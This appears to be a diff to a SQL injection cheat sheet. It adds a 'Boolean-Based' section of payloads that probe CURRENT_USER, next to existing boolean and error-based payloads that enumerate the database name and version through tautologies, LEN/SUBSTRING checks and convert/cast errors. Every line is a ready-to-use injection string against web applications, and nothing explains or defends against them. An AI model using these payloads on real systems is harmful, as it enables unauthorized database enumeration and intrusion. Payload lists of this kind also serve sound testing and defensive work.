@@ -92,6 +92,10 @@ www.example.com/xxx.php?id=1 or 1=1
 ' OR LEN(db_name())=13;--
 ' OR SUBSTRING(db_name(),1,5)='xxxxx';--
 
+-------------------Boolean-Based---------------------
+allllbc' OR LEN(CURRENT_USER)=3;--
+allllcs' OR SUBSTRING(CURRENT_USER,1,3)='DBO';--
+
 --------------------Error-Based----------------------
 '*cast((SELECT @@version) as int)*'        
 ' and 1=convert(int,@@version)-- -
